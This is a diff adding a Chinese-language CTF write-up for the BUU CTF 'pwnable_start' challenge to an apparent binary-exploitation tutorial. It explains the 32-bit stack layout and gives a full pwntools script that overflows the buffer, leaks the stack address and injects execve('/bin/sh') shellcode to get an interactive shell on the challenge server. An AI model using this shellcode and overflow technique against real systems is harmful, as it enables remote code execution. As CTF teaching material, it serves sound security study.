@@ -1117,6 +1117,70 @@ if __name__ == "__main__":
     main()
 ```
 
+#### 例题 5：pwnable_start
+
+[BUU CTF 题目链接](https://buuoj.cn/challenges#pwnable_start)
+
+这道题对看懂汇编要求挺高的，我觉得挺好的，详细写一下。
+
+没开 NX，先考虑 shellcode 注入。
+
+<img width="1702" height="603" alt="82f3d95871de6996b1c093df0fb01cce" src="https://github.com/user-attachments/assets/6760f795-eab7-48ac-84d3-f5b1e1243354" />
+
+32 位程序，`int     80h` 就是 syscall，eax 对应 rax 存储系统调用号，`ebx = fd,ecx = buf,edx = len`（对应 rdi，rsi，rdx）
+
+这里 al，cl，dl 指对应寄存器的 low 位置，比如 eax 是完整的四个字节，al 就是 rax的低 1 字节。
+
+32 位的 sys_write 的系统调用号为 4，64 位为 1，这也是不同的地方。
+
+```
+高地址
++------------------------+
+| 保存的 esp             |
++------------------------+
+|   _exit                |
++------------------------+
+| paddding(0x14)         |	<-- esp now
++------------------------+
+低地址
+```
+
+所以 `mov     ecx, esp` 使得输出 padding，然后在调用 read 的时候，并没有更改 ecx，所以会从 padding 位置开始输入，最后 `add     esp, 14h` 把 esp 上抬到指向 _exit，ret 执行。
+
+但是输入长度是 0x3C，所以可以覆盖  _exit，我们可以把 _exit 写成 write 的地址，这样 ret 之后 esp 就下移 4 位到了 **保存的 esp**，然后把保存的 esp 和后面一串不知道什么东西凑成 0x14 个字符输出。
+
+我们接受到了 esp，也是 ecx，也是我们 read 开始的地方，那么再填 0x14 个无意义字符就可以控制 `add     esp, 14h` 的抬栈，执行 shellcode。
+
+```
+# written by Sonnety
+from pwn import *
+context(os = 'linux',arch = 'i386',log_level = 'debug')
+context.terminal = ['tmux', 'splitw', '-h']
+
+
+host = "node5.buuoj.cn"
+port = 29276
+io = remote(host,port)
+# io = process("./start")
+sys_write = 0x8048087
+shellcode = b"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
+
+def main():
+    io.recvuntil(b"Let's start the CTF:")
+    payload = shellcode.ljust(0x14,b'\x00')
+    payload = b'A'*0x14 + p32(sys_write)
+    io.send(payload)
+    leak_data = io.recvn(4)
+    # print("\n[*] DEBUG : leak data = ",leak_data)
+    new_esp = u32(leak_data)
+    print("\n[+] Leak new esp adress :",hex(new_esp))
+    payload = b'A'*0x14 + p32(new_esp + 0x14) + shellcode
+    io.send(payload)
+    io.interactive()
+
+if __name__ == "__main__":
+    main()
+```
 
 ## 格式化字符串漏斗 && Canary 泄露
 
